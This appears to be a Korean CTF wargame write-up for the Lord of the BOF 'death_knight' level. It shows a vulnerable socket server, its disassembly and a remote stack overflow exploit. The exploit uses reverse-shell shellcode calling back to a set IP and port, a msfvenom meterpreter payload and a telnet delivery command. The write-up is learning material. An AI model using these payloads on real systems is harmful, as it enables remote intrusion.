# Level 19, Xavius -> Death_knight

## death_knight.c

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - dark knight
        - remote BOF
*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <dumpcode.h>

main()
{
        char buffer[40];

        int server_fd, client_fd;
        struct sockaddr_in server_addr;
        struct sockaddr_in client_addr;
        int sin_size;

        if((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
                perror("socket");
                exit(1);
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(6666);
        server_addr.sin_addr.s_addr = INADDR_ANY;
        bzero(&(server_addr.sin_zero), 8);

        if(bind(server_fd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1){
                perror("bind");
                exit(1);
        }

        if(listen(server_fd, 10) == -1){
                perror("listen");
                exit(1);
        }

        while(1) {
                sin_size = sizeof(struct sockaddr_in);
                if((client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &sin_size)) == -1){
                        perror("accept");
                        continue;
                }

                if (!fork()){
                        send(client_fd, "Death Knight : Not even death can save you from me!\n", 52, 0);
                        send(client_fd, "You : ", 6, 0);
                        recv(client_fd, buffer, 256, 0);
                        close(client_fd);
                        break;
                }

                close(client_fd);
                while(waitpid(-1,NULL,WNOHANG) > 0);
        }
        close(server_fd);
}
```

## Analysis

### Disassembling the "dark_knight"

```sh
Dump of assembler code for function main:
0x80488c4 <main>:       push   %ebp
0x80488c5 <main+1>:     mov    %ebp,%esp
0x80488c7 <main+3>:     sub    %esp,84
0x80488ca <main+6>:     push   0
0x80488cc <main+8>:     push   1
0x80488ce <main+10>:    push   2
0x80488d0 <main+12>:    call   0x804861c <socket>
0x80488d5 <main+17>:    add    %esp,12
0x80488d8 <main+20>:    mov    %eax,%eax
0x80488da <main+22>:    mov    DWORD PTR [%ebp-44],%eax
0x80488dd <main+25>:    cmp    DWORD PTR [%ebp-44],-1
0x80488e1 <main+29>:    jne    0x8048900 <main+60>
0x80488e3 <main+31>:    push   0x8048afb
0x80488e8 <main+36>:    call   0x804853c <perror>
0x80488ed <main+41>:    add    %esp,4
0x80488f0 <main+44>:    push   1
0x80488f2 <main+46>:    call   0x80485dc <exit>
0x80488f7 <main+51>:    add    %esp,4
0x80488fa <main+54>:    lea    %esi,[%esi]
0x8048900 <main+60>:    mov    DWORD PTR [%ebp-64],0x2
0x8048906 <main+66>:    push   0x1a0a
0x804890b <main+71>:    call   0x80485fc <htons>
0x8048910 <main+76>:    add    %esp,4
0x8048913 <main+79>:    mov    %eax,%eax
0x8048915 <main+81>:    mov    DWORD PTR [%ebp-62],%ax
0x8048919 <main+85>:    mov    DWORD PTR [%ebp-60],0x0
0x8048920 <main+92>:    push   8
0x8048922 <main+94>:    lea    %eax,[%ebp-64]
0x8048925 <main+97>:    lea    %edx,[%eax+8]
0x8048928 <main+100>:   push   %edx
0x8048929 <main+101>:   call   0x80485cc <bzero>
0x804892e <main+106>:   add    %esp,8
0x8048931 <main+109>:   push   16
0x8048933 <main+111>:   lea    %edx,[%ebp-64]
0x8048936 <main+114>:   mov    %eax,%edx
0x8048938 <main+116>:   push   %eax
0x8048939 <main+117>:   mov    %eax,DWORD PTR [%ebp-44]
0x804893c <main+120>:   push   %eax
0x804893d <main+121>:   call   0x80485bc <bind>
0x8048942 <main+126>:   add    %esp,12
0x8048945 <main+129>:   mov    %eax,%eax
0x8048947 <main+131>:   cmp    %eax,-1
0x804894a <main+134>:   jne    0x8048963 <main+159>
0x804894c <main+136>:   push   0x8048b02
0x8048951 <main+141>:   call   0x804853c <perror>
0x8048956 <main+146>:   add    %esp,4
0x8048959 <main+149>:   push   1
0x804895b <main+151>:   call   0x80485dc <exit>
0x8048960 <main+156>:   add    %esp,4
0x8048963 <main+159>:   push   10
0x8048965 <main+161>:   mov    %eax,DWORD PTR [%ebp-44]
0x8048968 <main+164>:   push   %eax
0x8048969 <main+165>:   call   0x804856c <listen>
0x804896e <main+170>:   add    %esp,8
0x8048971 <main+173>:   mov    %eax,%eax
0x8048973 <main+175>:   cmp    %eax,-1
0x8048976 <main+178>:   jne    0x8048990 <main+204>
0x8048978 <main+180>:   push   0x8048b07
0x804897d <main+185>:   call   0x804853c <perror>
0x8048982 <main+190>:   add    %esp,4
0x8048985 <main+193>:   push   1
0x8048987 <main+195>:   call   0x80485dc <exit>
0x804898c <main+200>:   add    %esp,4
0x804898f <main+203>:   nop
0x8048990 <main+204>:   nop
0x8048991 <main+205>:   jmp    0x8048998 <main+212>
0x8048993 <main+207>:   jmp    0x8048a60 <main+412>
0x8048998 <main+212>:   mov    DWORD PTR [%ebp-84],0x10
0x804899f <main+219>:   lea    %eax,[%ebp-84]
0x80489a2 <main+222>:   push   %eax
0x80489a3 <main+223>:   lea    %edx,[%ebp-80]
0x80489a6 <main+226>:   mov    %eax,%edx
0x80489a8 <main+228>:   push   %eax
0x80489a9 <main+229>:   mov    %eax,DWORD PTR [%ebp-44]
0x80489ac <main+232>:   push   %eax
0x80489ad <main+233>:   call   0x804855c <accept>
0x80489b2 <main+238>:   add    %esp,12
0x80489b5 <main+241>:   mov    %eax,%eax
0x80489b7 <main+243>:   mov    DWORD PTR [%ebp-48],%eax
0x80489ba <main+246>:   cmp    DWORD PTR [%ebp-48],-1
0x80489be <main+250>:   jne    0x80489d0 <main+268>
0x80489c0 <main+252>:   push   0x8048b0e
0x80489c5 <main+257>:   call   0x804853c <perror>
0x80489ca <main+262>:   add    %esp,4
0x80489cd <main+265>:   jmp    0x8048991 <main+205>
0x80489cf <main+267>:   nop
0x80489d0 <main+268>:   call   0x804854c <fork>
0x80489d5 <main+273>:   mov    %eax,%eax
0x80489d7 <main+275>:   test   %eax,%eax
0x80489d9 <main+277>:   jne    0x8048a30 <main+364>
0x80489db <main+279>:   push   0
0x80489dd <main+281>:   push   52
0x80489df <main+283>:   push   0x8048b20
0x80489e4 <main+288>:   mov    %eax,DWORD PTR [%ebp-48]
0x80489e7 <main+291>:   push   %eax
0x80489e8 <main+292>:   call   0x80485ec <send>
0x80489ed <main+297>:   add    %esp,16
0x80489f0 <main+300>:   push   0
0x80489f2 <main+302>:   push   6
0x80489f4 <main+304>:   push   0x8048b55
0x80489f9 <main+309>:   mov    %eax,DWORD PTR [%ebp-48]
0x80489fc <main+312>:   push   %eax
0x80489fd <main+313>:   call   0x80485ec <send>
0x8048a02 <main+318>:   add    %esp,16
0x8048a05 <main+321>:   push   0
0x8048a07 <main+323>:   push   0x100
0x8048a0c <main+328>:   lea    %eax,[%ebp-40]
0x8048a0f <main+331>:   push   %eax
0x8048a10 <main+332>:   mov    %eax,DWORD PTR [%ebp-48]
0x8048a13 <main+335>:   push   %eax
0x8048a14 <main+336>:   call   0x804860c <recv>
0x8048a19 <main+341>:   add    %esp,16
0x8048a1c <main+344>:   mov    %eax,DWORD PTR [%ebp-48]
0x8048a1f <main+347>:   push   %eax
0x8048a20 <main+348>:   call   0x804852c <close>
0x8048a25 <main+353>:   add    %esp,4
0x8048a28 <main+356>:   jmp    0x8048a60 <main+412>
0x8048a2a <main+358>:   lea    %esi,[%esi]
0x8048a30 <main+364>:   mov    %eax,DWORD PTR [%ebp-48]
0x8048a33 <main+367>:   push   %eax
0x8048a34 <main+368>:   call   0x804852c <close>
0x8048a39 <main+373>:   add    %esp,4
0x8048a3c <main+376>:   lea    %esi,[%esi*1]
0x8048a40 <main+380>:   push   1
0x8048a42 <main+382>:   push   0
0x8048a44 <main+384>:   push   -1
0x8048a46 <main+386>:   call   0x804858c <waitpid>
0x8048a4b <main+391>:   add    %esp,12
0x8048a4e <main+394>:   mov    %eax,%eax
0x8048a50 <main+396>:   test   %eax,%eax
0x8048a52 <main+398>:   jg     0x8048a56 <main+402>
0x8048a54 <main+400>:   jmp    0x8048a58 <main+404>
0x8048a56 <main+402>:   jmp    0x8048a40 <main+380>
0x8048a58 <main+404>:   jmp    0x8048991 <main+205>
0x8048a5d <main+409>:   lea    %esi,[%esi]
0x8048a60 <main+412>:   mov    %eax,DWORD PTR [%ebp-44]
0x8048a63 <main+415>:   push   %eax
0x8048a64 <main+416>:   call   0x804852c <close>
0x8048a69 <main+421>:   add    %esp,4
0x8048a6c <main+424>:   leave
0x8048a6d <main+425>:   ret
```

### Estimated Stack Structure

```c
|  int sin_size                   | [%ebp-84]
|  struct sockaddr_in client_addr | [%ebp-80]
|  struct sockaddr_in server_addr | [%ebp-64]
|  int client_fd                  | [%ebp-48]
|  int server_fd                  | [%ebp-44]
|  char buffer[40]                | [%ebp-40]
|  SFP                            | [%ebp]
|  RET                            | [%ebp+4]
|  ARGC                           | [%ebp+8]
```

## Exploit

### How to pwn

Remote Pwning

일반적인 `/bin/sh` 실행하는 쉘코드는 당연히 안먹힌다. (한번 입력받고 출력없이 연결이 끊어지기 때문) 이 때문에 reverse shell을 만드는 쉘코드를 주입해서 쉘을 가져와야 한다.

1. Reverse Shell 생성하는 쉘코드 만들기

msfvenom, peda 등등 쉘코드 생성하는 방법은 많지만 블로그 공략에서 본 [peda에서 쉘코드 생성하는 방법](http://grayfieldbox.tistory.com/entry/LOBLord-Of-BufferOverflow-xavius-deathknight)을 사용한다.

```sh
gdb-peda$ shellcode generate x86/linux connect 7777 192.168.206.1
# x86/linux/connect: 70 bytes
# port=7777, host=192.168.206.1
shellcode = (
    "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x93\x59"
    "\xb0\x3f\xcd\x80\x49\x79\xf9\x5b\x5a\x68\xc0\xa8\xce\x01\x66\x68"
    "\x1e\x61\x43\x66\x53\x89\xe1\xb0\x66\x50\x51\x53\x89\xe1\x43\xcd"
    "\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
    "\x89\xe1\xb0\x0b\xcd\x80"
)
```

2. 쉘코드 주입하기

다른 블로거 분들이 풀이한 방법을 보면 RET를 브루트포싱해서 억지로 찾아내려고 하는 걸 봤다. 왜그러지 했는데 일반적인 방법으로는 리턴할 주소를 찾아낼 방법이 없다ㅋ 

### Shellcode (24 bytes)

```sh
root@kali:~/Desktop# msfvenom -p linux/x86/meterpreter/reverse_tcp -f c LHOST=127.0.0.1 LPORT=7777 -b '\x0a\x00\x1a'
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 150 (iteration=0)
x86/shikata_ga_nai chosen with final size 150
Payload size: 150 bytes
Final size of c file: 654 bytes
unsigned char buf[] = 
"\xb8\xe6\x97\x41\xbf\xdb\xd3\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x1f\x31\x46\x15\x83\xee\xfc\x03\x46\x11\xe2\x13\xfd\x4b\xe1"
"\xea\xd9\xbb\xfe\x5f\x9d\x10\x6b\x5d\x91\xf1\xe2\x80\x1c\x7d"
"\x63\x19\xf7\x01\x8c\x9d\x06\x96\x8e\x9d\x16\x07\x06\x7c\x4c"
"\xa1\x40\x2e\xc0\x7a\xf8\x2f\xa1\x49\x7a\x2a\xe6\x2b\x62\x7a"
"\x93\xf6\xfc\x20\x5b\x09\xfd\x7c\x36\x09\x97\x79\x4f\xea\x56"
"\x48\x82\x6d\x1d\x8a\x64\xd3\xf5\x2d\x25\x2c\xb3\x31\x59\x33"
"\xc3\xb8\xba\xf2\x28\xb6\xfd\x16\xa2\x76\x80\x15\x3b\xf3\xbb"
"\xde\x2c\xa0\xb2\xfe\xd4\xe0\xc9\xb0\xe4\xc1\x52\x35\x2a\xa1"
"\x50\xc9\x4a\xe9\x54\x35\x8d\x09\xec\x34\x8d\x09\x12\xfa\x0d";
```

### Final Payload

```sh
python -c "print 'A'*44+'\x24\xfb\xff\xbf'+'\x90'*50+'\xb8\xe6\x97\x41\xbf\xdb\xd3\xd9\x74\x24\xf4\x5e\x33\xc9\xb1\x1f\x31\x46\x15\x83\xee\xfc\x03\x46\x11\xe2\x13\xfd\x4b\xe1\xea\xd9\xbb\xfe\x5f\x9d\x10\x6b\x5d\x91\xf1\xe2\x80\x1c\x7d\x63\x19\xf7\x01\x8c\x9d\x06\x96\x8e\x9d\x16\x07\x06\x7c\x4c\xa1\x40\x2e\xc0\x7a\xf8\x2f\xa1\x49\x7a\x2a\xe6\x2b\x62\x7a\x93\xf6\xfc\x20\x5b\x09\xfd\x7c\x36\x09\x97\x79\x4f\xea\x56\x48\x82\x6d\x1d\x8a\x64\xd3\xf5\x2d\x25\x2c\xb3\x31\x59\x33\xc3\xb8\xba\xf2\x28\xb6\xfd\x16\xa2\x76\x80\x15\x3b\xf3\xbb\xde\x2c\xa0\xb2\xfe\xd4\xe0\xc9\xb0\xe4\xc1\x52\x35\x2a\xa1\x50\xc9\x4a\xe9\x54\x35\x8d\x09\xec\x34\x8d\x09\x12\xfa\x0d'" > payload.txt

(cat payload.txt; cat) | telnet 127.0.0.1 6666
```

## Result

```sh

```